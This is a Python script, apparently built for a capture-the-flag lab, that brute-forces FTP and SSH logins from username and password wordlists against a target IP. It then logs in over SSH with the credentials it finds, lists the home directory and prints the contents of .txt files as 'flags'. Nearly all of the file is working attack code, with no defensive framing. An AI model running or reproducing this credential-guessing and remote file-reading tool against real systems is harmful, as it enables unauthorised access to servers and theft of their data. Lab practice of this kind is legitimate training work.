import paramiko
import ftplib
import time
import socket
import sys, os
from atack_http import AtackHttp


def brute_force_FTP(targetIP: str) -> None:
    """Gets ip address and tries to login to FTP server 
    users and passwords from file
    uses module ftplib.FTP()

    Args:
        targetIP (str): ip address
    Returns: FTP_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling brute_force_FTP on {targetIP}")

    # files: users and passwords operations
    
    password_file = "passwd.txt"
    users_file = "users.txt"
    users = open(users_file)
    passwds = open(password_file)
    users_list = users.read().split("\n")
    pass_list = passwds.read().split("\n")
    users.close()
    passwds.close()

    ftpServer = ftplib.FTP()
    FTP_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            try:
                print(f"Trying: {user}: {passwd}")
                ftpServer.connect(targetIP, 21, timeout=1000)
                ftpServer.login(user, passwd)
                print(f"[+] Found combo for FTP:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                user_pass.append([user, passwd])
                FTP_credentials[targetIP] = user_pass
                ftpServer.close()
                break
            except Exception as error:
                print(f"[!] {error}")
    return FTP_credentials

def try_connect(hostname, username, password, port=22) -> dict:
    """_summary_
    Args:
        hostname (str): hostname
        username (str): username
        password (str): password
        port (int, optional): port number Defaults to 22.
    Returns:
        dict: dict consists of three parameters: ip, user and password if those are valid otherwise returns False:bool
    """
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port)
    except socket.timeout:
        # this is when host is unreachable
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        # sleep for ten seconds
        time.sleep(10)
        return try_connect(hostname, username, password, port)
    else:
        # connection was established successfully
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return {'hostname' : hostname, 'username' : username, 'password' : password}

def brute_force_SSH(targetIP: str) -> dict:
    """Gets ip address and tries to login to SSH server 
    users and passwords from file
    uses module paramiko.SSHClient()
    Args:
        targetIP (str): ip address
    Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling: brute_force_SSH on {targetIP}")

    # files: users and passwords operations
    password_file = "passwd.txt"
    passwds = open(password_file)
    pass_list = passwds.readlines()
    passwds.close()

    users_file = "users.txt"
    users = open(users_file)
    users_list = users.readlines()
    users.close()

    SSH_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            if try_connect(targetIP, user,passwd):
                user_pass.append([user,passwd])
                break
        
    SSH_credentials[targetIP] = user_pass
    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system 


def read_file(slownik: dict, target_ip):
    autenticated = False
    #slownik = brute_force_SSH(target_ip)
    sshserver = paramiko.SSHClient()
    sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sshserver.load_system_host_keys()
    for ip_adr, user_list in slownik.items():
        for user in user_list:
            sshserver.connect(hostname=target_ip, username=user[0], password=user[1], timeout=3, banner_timeout=2000, auth_timeout=60)
            tr = sshserver.get_transport()
            if sshserver:
                autenticated = True
                command = "ls -a"
                stdin, stdout, stderr = sshserver.exec_command(command)
                lista = stdout.readlines()
                print(f"List of {user[0]} files:")
                for list in lista:
                    print(f"{list.strip()}")
                    plik = list.find(".txt")
                    if plik != -1:
                        polecenie = "cat " + list.strip()
                        stdin, stdout, stderr = sshserver.exec_command(polecenie)
                        print(stderr.read())
                        flaga = stdout.readlines()[0]
                        print(f"Flaga z pliku {list.strip()} to: {flaga} ")
                        tr = sshserver.get_transport()
                        tr.banner_timeout = 3000
                        tr.close()
                        tr.stop_thread()
                        sshserver.close()
                        autenticated = False
                        break

def brute_force(hosts_ports_list: dict):
    for ip_addr, ports in hosts_ports_list.items():
        for port in ports:
            if port == 21:
                print(brute_force_FTP(ip_addr))
            if port == 22:
                slownik = brute_force_SSH(ip_addr)
                print(slownik)
                #print(brute_force_SSH(ip_addr))
                read_file(slownik, ip_addr)
            #if port == 80:
            #    adres = "http://"+ip_addr
            #    atack = AtackHttp()
            #    atack.print_list(adres)



# param = {'192.168.10.100': (21,22,80)}
# ip = '192.168.10.100'
# # brute_force_FTP(ip)
# # brute_force_SSH(ip)
# brute_force(param)

